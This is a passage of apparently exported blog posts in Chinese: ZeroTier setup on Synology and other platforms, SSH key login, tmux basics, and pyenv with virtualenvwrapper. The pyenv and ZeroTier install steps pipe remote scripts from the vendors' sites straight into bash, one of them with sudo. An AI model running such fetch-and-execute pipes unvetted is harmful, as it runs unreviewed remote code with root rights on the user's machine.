<li>Identity files moved to more traditional location /var/lib/zerotier-one, and are now preserved across uninstalls, reinstalls, updates, etc. Prior to this version, during uninstall we were intentionally deleting your identity files just for thoroughness but this seems to be annoying to most users (rightly so). So uninstalling and updating to this version is the last time that your configuration will get wiped. See tickets #41</li>
<li>Service script now sends proper SIGKILL signal</li>
<li>Segfault on ARM (might be fixed), see ticket #52</li>
<li>Memory leak (might be fixed), see ticket #46</li>
</ul>
<p>To view logs for this package, see: /var/log/packages/zerotier.log</p>
</blockquote>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol>
<li><a href="https://github.com/zerotier/ZeroTierNAS/issues/28">Synology Nas’es lose virtual interface address after reboot.</a></li>
<li><a href="https://ruimarinho.github.io/post/fix-tun-tap-not-available-on-a-synology-nas/">Fix TUN/TAP not available on a Synology NAS</a></li>
</ol>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>内网穿透</tag>
        <tag>群晖</tag>
        <tag>ZeroTier</tag>
      </tags>
  </entry>
  <entry>
    <title>群晖 SSH 公钥免密登录</title>
    <url>/2021/02/20/syno-ssh/</url>
    <content><![CDATA[<ol>
<li>首先 <code>SSH</code> 登录群晖，检测群晖当前用户主目录下是否有 <code>.ssh</code> 文件夹，如果没有使用下列命令创建：<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> ~/.ssh</span><br></pre></td></tr></table></figure></li>
<li>使用 <code>vim ~/.ssh/authorized_keys</code> 将自己的 <code>SSH</code> 公钥粘贴进去，按 <code>ESC</code> 输入 <code>wq</code> 并回车保存。</li>
</ol>
<span id="more"></span>

<ol start="3">
<li><p>如果没有公钥的话，需要在自己电脑上使用 <code>ssh-keygen -t rsa -C &quot;MyName&quot;</code> 创建一个密钥，然后使用 <code>cat ~/.ssh/id_rsa.pub</code> 获取公钥信息，粘贴到<strong>群晖</strong>的 <code>~/.ssh/authorized_keys</code> 文件中。</p>
</li>
<li><p>设置权限：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chmod</span> 755 ~</span><br><span class="line"><span class="built_in">chmod</span> 600 ~/.ssh/authorized_keys</span><br><span class="line"><span class="built_in">chmod</span> 700 ~/.ssh</span><br></pre></td></tr></table></figure>

</li>
</ol>
<p><strong>Ps: 群晖用户目录权限默认为 777，必须要修改为755才能免密登录</strong></p>
<ol start="5">
<li>修改 <code>sshd_config</code> 配置文件:<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/ssh/sshd_config</span><br></pre></td></tr></table></figure>

</li>
</ol>
<p>修改上述文件中以下几个配置：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">RSAAuthentication yes</span><br><span class="line">PubkeyAuthentication yes</span><br><span class="line">AuthorizedKeysFile .ssh/authorized_keys</span><br></pre></td></tr></table></figure>

<ol start="6">
<li><p>在群晖<code>控制面板 -&gt; 终端机和 SNMP</code> 关闭再开启 <code>SSH</code>，即可免密登录群晖。</p>
</li>
<li><p>如果设置成功后为了安全起见，建议在保存好 <code>密钥对（id_rsa 和 id_rsa.pub）</code>的情况下，关闭密码登录群晖 <code>SSH</code>。<br>修改 <code>sshd_config</code> 配置文件:</p>
</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/ssh/sshd_config</span><br></pre></td></tr></table></figure>

<p>修改上述文件中以下配置：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PasswordAuthentication no</span><br></pre></td></tr></table></figure>
<p>然后步骤 6 重启群晖 <code>SSH</code> 即可关闭密码登录群晖 <code>SSH</code>。</p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>群晖</tag>
      </tags>
  </entry>
  <entry>
    <title>Tmux入门指南</title>
    <url>/2017/07/16/tmux%E5%85%A5%E9%97%A8%E6%8C%87%E5%8D%97/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>很多时候我们需要通过SSH连接服务器进行一些操作，费了好长时间调好了程序，一顿饭的功夫SSH超时了(broken pipe)，重新连上去正在运行的程序也都没了，一切又得从头再来。这个时候你就非常需要用到tmux了，用tmux在服务器上创建一个会话（Session），在该会话中进行操作，你可以随时随地断开和重新连接会话（Session），即便是SSH中断了你在远程服务器上的工作状态也可以持久化地保存。</p>
<span id="more"></span>
<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><blockquote>
<p>tmux 是一个优秀的终端复用器类自由软件，功能类似 GNU Screen，但使用 BSD 许可发布。用户可以通过 tmux 在一个终端内管理多个分离的会话，窗口及面板，对于同时使用多个命令行，或多个任务时非常方便。</p>
</blockquote>
<h2 id="功能特性："><a href="#功能特性：" class="headerlink" title="功能特性："></a>功能特性：</h2><blockquote>
<ul>
<li>一个虚拟终端可以管理多个会话，窗口和面板</li>
<li>支持分屏，同时处理多个操作</li>
<li>窗口、面板可以在会话间自由移动，切换</li>
<li>丰富灵活的状态行展示</li>
<li>支持自定义快捷键，依照个人习惯配置令操作更高效</li>
<li>不受断网影响，避免丢失重要工作进度</li>
<li>结对编程，方便演示与协作</li>
<li>自带复制粘贴缓冲区管理</li>
<li>脚本化配置，可配置多种操作环境</li>
</ul>
</blockquote>
<h2 id="层次结构"><a href="#层次结构" class="headerlink" title="层次结构"></a>层次结构</h2><p><img src="/images/tmux%E5%85%A5%E9%97%A8%E6%8C%87%E5%8D%97tmux1.png"><br>tmux的主要元素分为三层：</p>
<ul>
<li>Session 一组窗口的集合，通常用来概括同一个任务。session可以有自己的名字便于任务之间的切换。</li>
<li>Window 单个可见窗口。Windows有自己的编号，也可以认为和ITerm2中的Tab类似。</li>
<li>Pane 窗格，被划分成小块的窗口，类似于Vim中 C-w +v 后的效果。</li>
</ul>
<h1 id="安装tmux"><a href="#安装tmux" class="headerlink" title="安装tmux"></a>安装tmux</h1><h2 id="Linux安装"><a href="#Linux安装" class="headerlink" title="Linux安装"></a>Linux安装</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get install tmux</span><br></pre></td></tr></table></figure>
<h2 id="Mac-OS安装"><a href="#Mac-OS安装" class="headerlink" title="Mac OS安装"></a>Mac OS安装</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">brew install tmux</span><br></pre></td></tr></table></figure>
<h1 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h1><p>首先在tmux会话中使用的快捷键都需要一个前缀来激活，前缀默认为Ctrl+b（即：在按快捷键之前需要按一下前缀）。</p>
<h2 id="查询所有会话（Session）"><a href="#查询所有会话（Session）" class="headerlink" title="查询所有会话（Session）"></a>查询所有会话（Session）</h2><p>在命令行输入下列命令查询当前所有会话。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tmux ls</span><br></pre></td></tr></table></figure>
<p>你会发现<code>no server running on /private/tmp/tmux-501/default</code>，这是因为我们还没有创建会话（Session）。</p>
<h2 id="创建会话（Session"><a href="#创建会话（Session" class="headerlink" title="创建会话（Session)"></a>创建会话（Session)</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tmux new -s session-name</span><br></pre></td></tr></table></figure>
<p>通过上述命令新建一个有特定名称的会话。<br>一般情况下我们不会使用下列命令创建不指定名字的会话。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tmux new</span><br></pre></td></tr></table></figure>
<h1 id="断开会话（Session）"><a href="#断开会话（Session）" class="headerlink" title="断开会话（Session）"></a>断开会话（Session）</h1><p>使用下列命令断开当前会话（断开会话并不影响会话中运行的程序，断开后还可以重新连接）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tmux detach</span><br></pre></td></tr></table></figure>
<p>或者使用tmux中的快捷键</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Ctrl+b d(即先使用Ctrl+b快捷键前缀，然后再按d)</span><br></pre></td></tr></table></figure>
<h1 id="重新连接会话（Session）"><a href="#重新连接会话（Session）" class="headerlink" title="重新连接会话（Session）"></a>重新连接会话（Session）</h1><p>在命令行输入<code>tmux a</code>即可快速连接第一个所有会话中的第一个。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tmux a</span><br></pre></td></tr></table></figure>
<p>或者通过会话名连接该一个会话</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tmux a -t session-name</span><br></pre></td></tr></table></figure>
<h1 id="关闭会话"><a href="#关闭会话" class="headerlink" title="关闭会话"></a>关闭会话</h1><p>通过下列命令关闭会话后，会话中的程序也会全部关闭。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tmux kill-session -t session-name</span><br></pre></td></tr></table></figure>
<p>当然你也可以通过直接按<code>Ctrl+d</code>关闭会话、窗口或窗格。</p>
<h1 id="tmux中的快捷键参考"><a href="#tmux中的快捷键参考" class="headerlink" title="tmux中的快捷键参考"></a>tmux中的快捷键参考</h1><p>注意以下快捷键适用于tmux会话中，使用前皆需要按下快捷键前缀<code>Ctrl+b</code>。</p>
<h2 id="帮助"><a href="#帮助" class="headerlink" title="帮助"></a>帮助</h2><ul>
<li>？ 获取帮助信息</li>
</ul>
<h2 id="会话（Session）管理"><a href="#会话（Session）管理" class="headerlink" title="会话（Session）管理"></a>会话（Session）管理</h2><ul>
<li>s 列出所有会话</li>
<li>$ 重命名当前的会话</li>
<li>d 断开当前的会话</li>
</ul>
<h2 id="窗口（Window）管理"><a href="#窗口（Window）管理" class="headerlink" title="窗口（Window）管理"></a>窗口（Window）管理</h2><ul>
<li>c 创建一个新窗口</li>
<li>, 重命名当前窗口</li>
<li>w 列出所有窗口</li>
<li>% 水平分割窗口</li>
<li>“ 竖直分割窗口</li>
<li>n 选择下一个窗口</li>
<li>p 选择上一个窗口</li>
<li>0<del>9 选择0</del>9对应的窗口</li>
</ul>
<h2 id="窗格（Pane）管理"><a href="#窗格（Pane）管理" class="headerlink" title="窗格（Pane）管理"></a>窗格（Pane）管理</h2><ul>
<li>% 创建一个水平窗格</li>
<li>“ 创建一个竖直窗格</li>
<li>q 显示窗格的编号</li>
<li>o 在窗格间切换</li>
<li>} 与下一个窗格交换位置</li>
<li>{ 与上一个窗格交换位置</li>
<li>! 在新窗口中显示当前窗格</li>
<li>x 关闭当前窗格</li>
</ul>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><ul>
<li>t 在当前窗格显示时间</li>
</ul>
<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><ol>
<li><a href="http://blog.jobbole.com/87278/">Tmux 入门介绍</a></li>
<li><a href="http://blog.jobbole.com/87562/?utm_source=blog.jobbole.com&utm_medium=relatedPosts">Tmux：Linux 从业者必备利器</a></li>
</ol>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>tmux</tag>
      </tags>
  </entry>
  <entry>
    <title>pyenv virtualenvwrapper 打造多版本 Python 环境</title>
    <url>/2017/11/08/virtualenvwrapper-pyenv-%E6%89%93%E9%80%A0%E5%A4%9A%E7%89%88%E6%9C%AC-Python-%E7%8E%AF%E5%A2%83/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>面对多个 Python 开发项目时，需要针对不同的项目创建相应的开发环境。通常情况下，使用 virtualenv 创建一个虚拟的独立 Python 环境，但是 virtualenv 创建的环境相对分散不便于管理。这里推荐使用 virtualenvwrapper 来创建集中的便于管理的 Python 环境，同时可以结合 pyenv 为不同的项目选定不同的 Python 版本。</p>
<span id="more"></span>

<h1 id="pyenv"><a href="#pyenv" class="headerlink" title="pyenv"></a>pyenv</h1><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><p>使用下列命令自动安装 pyenv:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ curl -L https://raw.githubusercontent.com/pyenv/pyenv-installer/master/bin/pyenv-installer | bash</span><br></pre></td></tr></table></figure>
<h3 id="Mac-OS-X"><a href="#Mac-OS-X" class="headerlink" title="Mac OS X"></a>Mac OS X</h3><p>使用 homebrew 直接安装：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ brew update</span><br><span class="line">$ brew install pyenv</span><br></pre></td></tr></table></figure>
<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>在.bashrc(或.zshrc)中添加下列内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export PYENV_ROOT=&quot;$HOME/.pyenv&quot;</span><br><span class="line">export PATH=&quot;$PYENV_ROOT/bin:$PATH&quot;</span><br><span class="line">eval &quot;$(pyenv init -)&quot;</span><br></pre></td></tr></table></figure>
<p>然后重启 shell，使配置生效。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ exec &quot;$SHELL&quot;</span><br></pre></td></tr></table></figure>

<h2 id="安装-Python-时依赖环境"><a href="#安装-Python-时依赖环境" class="headerlink" title="安装 Python 时依赖环境"></a>安装 Python 时依赖环境</h2><p>安装 Python 时需要提前安装好所需的依赖环境。</p>
<ul>
<li>Ubuntu/Debian:<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get install -y make build-essential libssl-dev zlib1g-dev libbz2-dev \</span><br><span class="line">libreadline-dev libsqlite3-dev wget curl llvm libncurses5-dev libncursesw5-dev \</span><br><span class="line">xz-utils tk-dev libffi-dev liblzma-dev</span><br></pre></td></tr></table></figure></li>
<li>Fedora/CentOS/RHEL:<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo yum install zlib-devel bzip2 bzip2-devel readline-devel sqlite sqlite-devel \</span><br><span class="line">openssl-devel xz xz-devel libffi-devel</span><br></pre></td></tr></table></figure>
Alternative of openssl-devel:<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo yum install compat-openssl10-devel --allowerasing</span><br></pre></td></tr></table></figure></li>
<li>openSUSE<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">zypper in zlib-devel bzip2 libbz2-devel readline-devel sqlite3 sqlite3-devel libopenssl-devel xz xz-devel</span><br></pre></td></tr></table></figure></li>
<li>macOS:<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">brew install readline xz</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p><strong>1.</strong> 查看所有 Python 版本  </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ pyenv versions</span><br></pre></td></tr></table></figure>

<p>执行命令将打印出安装的所有 Python 版本，<code>*</code>表示当前使用的 Python 版本。</p>
<p><strong>2.</strong> 查询所有可安装的 Python 版本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ pyenv install -l</span><br></pre></td></tr></table></figure>

<p><strong>3.</strong> 安装与卸载</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ pyenv install 2.7.14</span><br></pre></td></tr></table></figure>
<p>安装 Python 2.7.14 版本。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ pyenv uninstall 2.7.14</span><br></pre></td></tr></table></figure>
<p>卸载 Python 2.7.14 版本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ pyenv rehash</span><br></pre></td></tr></table></figure>
<p>创建垫片路径（为所有已安装的可执行文件创建 shims，如：~/.pyenv/versions/*/bin/*，因此，每当你增删了 Python 版本或带有可执行文件的包（如 pip）以后，都应该执行一次本命令）。</p>
<p><strong>4.</strong> 设置 Python 版本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ pyenv shell 2.7.14  # 设置面向 shell 的 Python 版本，通过设置当前 shell 的 PYENV_VERSION 环境变量的方式。</span><br><span class="line">$ pyenv local 2.7.14  # 设置 Python 本地版本，通过将版本号写入当前目录下的 .python-version 文件的方式。通过这种方式设置的 Python 版本优先级较 global 高。</span><br><span class="line">$ pyenv global 2.7.14  # 设置全局的 Python 版本，通过将版本号写入 ~/.pyenv/version 文件的方式。</span><br></pre></td></tr></table></figure>
<p><strong>注意：</strong> shell &gt; local &gt; global。pyenv 会从当前目录开始向上逐级查找 .python-version 文件，直到根目录为止。若找不到，就用 global 版本。</p>
<p><strong>Ps: 因为系统本身常常会依赖自带的 python 版本，所以尽量不要修改 global。</strong></p>
<p><strong>5.</strong> 取消 shell 或 local python 版本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ pyenv shell --unset</span><br><span class="line">$ pyenv local --unset</span><br></pre></td></tr></table></figure>

<h2 id="使用镜像加速下载"><a href="#使用镜像加速下载" class="headerlink" title="使用镜像加速下载"></a>使用镜像加速下载</h2><p>通过下列脚本使用国内搜狐的镜像快速安装各版本 Python：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">v=3.6.3;wget https://npm.taobao.org/mirrors/python/$v/Python-$v.tar.xz -P $(pyenv root)/cache/;pyenv install $v</span><br></pre></td></tr></table></figure>
<p><strong>注意：v 为 Python 版本号，请根据需要自行更改。</strong></p>
<p><strong>搜狐镜像貌似关闭了，可以自行下载指定的 Python 版本安装包放入，<code>$(pyenv root)/cache/</code> 文件夹下，然后执行 <code>pyenv install xxx(版本号)</code> 安装相应的 python 版本，安装时会使用缓存安装包。</strong></p>
<h1 id="pyenv-virtualenvwrapper"><a href="#pyenv-virtualenvwrapper" class="headerlink" title="pyenv-virtualenvwrapper"></a>pyenv-virtualenvwrapper</h1><h2 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h2><h3 id="Linux-1"><a href="#Linux-1" class="headerlink" title="Linux"></a>Linux</h3><p>通过下列命令安装 pyenv-virtualenvwrapper:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ git clone https://github.com/pyenv/pyenv-virtualenvwrapper.git $(pyenv root)/plugins/pyenv-virtualenvwrapper</span><br></pre></td></tr></table></figure>
<h3 id="Mac-OS-X-1"><a href="#Mac-OS-X-1" class="headerlink" title="Mac OS X"></a>Mac OS X</h3><p>Mac OS X 下可选择使用使用 Homebrew 来安装：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ brew install pyenv-virtualenvwrapper</span><br></pre></td></tr></table></figure>
<h2 id="激活"><a href="#激活" class="headerlink" title="激活"></a>激活</h2><p>安装完成后使用下列命令激活 pyenv-virtualenvwrapper：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ pyenv virtualenvwrapper_lazy</span><br></pre></td></tr></table></figure>

<h2 id="配置-1"><a href="#配置-1" class="headerlink" title="配置"></a>配置</h2><p>在.bashrc(或.zshrc)中添加下列内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export PYENV_VIRTUALENVWRAPPER_PREFER_PYVENV=&quot;true&quot;</span><br><span class="line">export WORKON_HOME=$HOME/.virtualenvs</span><br><span class="line">pyenv virtualenvwrapper_lazy</span><br></pre></td></tr></table></figure>
<p>然后重启 shell，使配置生效。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ exec &quot;$SHELL&quot;</span><br></pre></td></tr></table></figure>


<h2 id="使用-1"><a href="#使用-1" class="headerlink" title="使用"></a>使用</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ pyenv shell 3.6.3  # 设置当前 shell python 版本为 3.6.3</span><br><span class="line">$ pip install virtualenvwrapper  # 第一次使用新的 Python 环境需要安装此包，否则创建的虚拟环境 Python 版本仍为系统默认</span><br><span class="line">$ mkvirtualenv python3  # 创建 python 3.6.3 版本的虚拟环境 python3</span><br></pre></td></tr></table></figure>
<h2 id="virtualenvwrapper-使用方法"><a href="#virtualenvwrapper-使用方法" class="headerlink" title="virtualenvwrapper 使用方法"></a>virtualenvwrapper 使用方法</h2><ul>
<li><code>workon</code>: 打印所有的虚拟环境；</li>
<li><code>mkvirtualenv xxx</code>: 创建 xxx 虚拟环境;</li>
<li><code>workon xxx</code>: 使用 xxx 虚拟环境;</li>
<li><code>deactivate</code>: 退出 xxx 虚拟环境；</li>
<li><code>rmvirtualenv xxx</code>: 删除 xxx 虚拟环境。</li>
</ul>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol>
<li><a href="https://github.com/pyenv/pyenv">pyenv 文档</a></li>
<li><a href="https://virtualenvwrapper.readthedocs.io/en/latest/install.html">virtualenvwrapper 文档</a></li>
<li><a href="https://github.com/pyenv/pyenv-virtualenvwrapper">pyenv-virtualenvwrapper 文档</a></li>
<li><a href="http://einverne.github.io/post/2017/04/pyenv.html">使用 pyenv 管理 Python 版本</a></li>
<li><a href="https://segmentfault.com/a/1190000006174123">pyenv 安装配置与国内镜像加速</a></li>
</ol>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>P2P 内网穿透工具 ZeroTier</title>
    <url>/2019/07/07/zerotier-one-start/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在外面的时候可能会需要连接家里放的树莓派、智能路由器(Openwrt)、NAS 等设备，但是家里的网络一般没有公网 IP 不能直接连接，这时候就需要使用各种内网穿透的方法连接家中的设备。</p>
<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>常见的内网穿透方法有 OpenVPN、 FRP、Ngrok 等，这些方案一般需要一个有公网 IP 的 VPS 做反向代理进行内网穿透连接，连接的速度取决于做中转代理的 VPS 的最大带宽。一般而言代价比较昂贵。今天介绍一款不需要公网 IP 就可以实现内网穿透d，而且最好的情况下连接的速度可以达到当前带宽的最大速度 —— ZeroTier。</p>
<blockquote>
<p>ZeroTier is a smart Ethernet switch for planet Earth.</p>
</blockquote>
<span id="more"></span>

<h1 id="基本原理介绍"><a href="#基本原理介绍" class="headerlink" title="基本原理介绍"></a>基本原理介绍</h1><p>ZeroTier 利用 P2P(Peer to Peer) 的方式进行连接。</p>
<p>根服务器 R 记录了路径信息，设备 A 能通过 <strong>ZeroTier 唯一地址标识</strong>找到需要连接的设备 B</p>
<p>这个过程如下：</p>
<ol>
<li>A 想要将数据包发送到 B，但由于它没有直接路径，因此将其向上发送到 R。</li>
<li>如果 R 有直接链接到 B，它会转发数据包给 B。否则它会继续向上游发送数据包，直到达到行星根(planet)。行星根知道所有节点，所以如果 B 在线，最终数据包将到达 B。</li>
<li>R 还向 A 发送一个名为<strong>会和</strong>的消息，包含有关它如何到达 B 的提示。同时，将<strong>会和</strong>发给 B，通知 B 它如何到达 A。</li>
<li>A 和 B 获取它们的会合消息并尝试相互发送测试消息，可能会对 NAT 或状态防火墙进行穿透。如果这样可以建立直接链路，则不再需要中继。</li>
<li>如果无法建立直接路径，则通信可以继续中继(速度慢)</li>
</ol>
<p>ZeroTier 官方搭建了一个行星根服务器叫做地球 Earth，行星根服务器唯一的且是免费的，它记录了所有的路径信息，一般情况下大家都直接用的这个。除此之外还有 12 个遍布全球的根服务器，这些是收费的服务。所以如果使用免费套餐，连接时的延迟可能会很高，另外由于 Earth 在国外，一些不确定因素可能会影响到使用。考虑到网络的不确定性，ZeroTier 能自己创建根服务器月球 Moons，这样就能在大局域网中得到更好的体验了。</p>
<h1 id="安装客户端"><a href="#安装客户端" class="headerlink" title="安装客户端"></a>安装客户端</h1><p>ZeroTier 是跨平台的，能安装在几乎任何平台</p>
<p>Windows、macOS、Linux、iOS、Android、QNAP、Synology、西数 MyCloud NAS，下载地址：<a href="https://www.zerotier.com/download/">https://www.zerotier.com/download/</a></p>
<p>这里主要介绍一下常见几个平台安装方案：</p>
<h2 id="MacOS"><a href="#MacOS" class="headerlink" title="MacOS"></a>MacOS</h2><ol>
<li>直接下载安装包进行安装：<a href="https://download.zerotier.com/dist/ZeroTier%20One.pkg">ZeroTier One.pkg</a></li>
<li>使用 <code>brew cask</code> 进行安装</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">brew cask install zerotier-one</span><br></pre></td></tr></table></figure>

<h3 id="启动和停止"><a href="#启动和停止" class="headerlink" title="启动和停止"></a>启动和停止</h3><ul>
<li>启动：<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo launchctl load /Library/LaunchDaemons/com.zerotier.one.plist</span><br></pre></td></tr></table></figure></li>
<li>停止<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo launchctl unload /Library/LaunchDaemons/com.zerotier.one.plist</span><br></pre></td></tr></table></figure>
<h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2>运行下列命令进行安装：<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -s https://install.zerotier.com | sudo bash</span><br></pre></td></tr></table></figure>
<h3 id="启动和停止-1"><a href="#启动和停止-1" class="headerlink" title="启动和停止"></a>启动和停止</h3></li>
<li>启动<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo zerotier-one -d</span><br></pre></td></tr></table></figure></li>
<li>停止<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ps -ef | grep <span class="string">&quot;zerotier-one -d&quot;</span> | grep -v grep | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs <span class="built_in">kill</span> -9</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h2 id="安卓"><a href="#安卓" class="headerlink" title="安卓"></a>安卓</h2><p>下载安装包进行安装：<a href="https://play.google.com/store/apps/details?id=com.zerotier.one">Get in Google Play Store</a></p>
<p><strong>Ps: 不能访问的同学请自行百度搜索相关安装包下载安装</strong></p>
<h1 id="ZeroTier-使用教程"><a href="#ZeroTier-使用教程" class="headerlink" title="ZeroTier 使用教程"></a>ZeroTier 使用教程</h1><p>一般情况下我们可以先使用 ZeroTier 提供的免费服务，不需要自己创建 Moons 服务器。</p>
<h2 id="注册账号"><a href="#注册账号" class="headerlink" title="注册账号"></a>注册账号</h2><p>进入官网进行注册: <a href="https://my.zerotier.com/">https://my.zerotier.com/</a></p>
<p><img src="/images/zerotier-1.png"></p>
<p>登录后显示如下界面，直接使用默认的免费方案能够连接 100 个设备。</p>
<p><img src="/images/zerotier-2.png"></p>
<h2 id="创建网络"><a href="#创建网络" class="headerlink" title="创建网络"></a>创建网络</h2><p><img src="/images/zerotier-3.png"></p>
<p>创建网络后使用默认配置即可，切记<strong>不要</strong>将自己的网络设置里的 <code>Access Control</code> 设为公开网络(PUBLIC)!!!</p>
<p><img src="/images/zerotier-4.png"></p>
<h2 id="客户端命令行操作网络"><a href="#客户端命令行操作网络" class="headerlink" title="客户端命令行操作网络"></a>客户端命令行操作网络</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 加入网络</span></span><br><span class="line">sudo zerotier-cli <span class="built_in">join</span> Network ID</span><br><span class="line"><span class="comment"># 离开网络</span></span><br><span class="line">sudo zerotier-cli leave Network ID</span><br><span class="line"><span class="comment"># 列出整个网络中的所有节点</span></span><br><span class="line">sudo zerotier-cli listnetworks</span><br></pre></td></tr></table></figure>
<p>其中 <code>Network ID</code> 为刚刚创建网络时生成的值，请根据自己的网络添加。</p>
<p>MacOS 可以直接打开软件加入网络：<br><img src="/images/zerotier-5.png"></p>
<h2 id="网站后台认证"><a href="#网站后台认证" class="headerlink" title="网站后台认证"></a>网站后台认证</h2><p>加入网络后需要在网站后台认证后方可使用</p>
<p><img src="/images/zerotier-6.png"></p>
<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>选择两台安装好的机器进行测试，互相 Ping 一下分配的 IP 看是否可以连通。有时候会处理连接不通大量丢包的现象，请耐心等待一会儿。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol>
<li><a href="https://www.zerotier.com/download/">ZeroTier One</a></li>
<li><a href="https://zhih.me/zerotier-getting-started/">ZeroTier内网穿透教程</a></li>
</ol>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>内网穿透</tag>
        <tag>ZeroTier</tag>
      </tags>
  </entry>
  <entry>
    <title>一天一夜chromebook折腾心得</title>
    <url>/2016/03/15/%E4%B8%80%E5%A4%A9%E4%B8%80%E5%A4%9Cchromebook%E6%8A%98%E8%85%BE%E5%BF%83%E5%BE%97/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在学习Python的过程中了解到Python程序员工作环境多为Linux，所以就有了学习Linux系统的打算。最初是在windows系统虚拟机里安装了Ubuntu，奈何体验不太好。在考虑入手树莓派的时候无意间看到了ChromeBook，一下子就陷了进去不能自拔，慢慢发现还能在原装Chrome OS中装上Linux，一冲动就买了一台二手HP ChromeBook 14，开始了一天一夜的搞机生活。</p>
<span id="more"></span>
<hr>
<h1 id="激活教程"><a href="#激活教程" class="headerlink" title="激活教程"></a>激活教程</h1><p>买到新机器首先要进行激活，也就是登陆谷歌账号。但是由于谷歌在天朝被封，所以我门需要利用一些技术手段激活自己的ChromeBook，这里我给大家推荐两种方法：<br>1.使用PAC代理服务器：<a href="http://pac.itzmx.com/">http://pac.itzmx.com/</a><br>2.使用ChromeBook吧置顶帖<a href="http://tieba.baidu.com/p/4308430637">Chrome设备hosts 替换&amp;激活 教程</a></p>
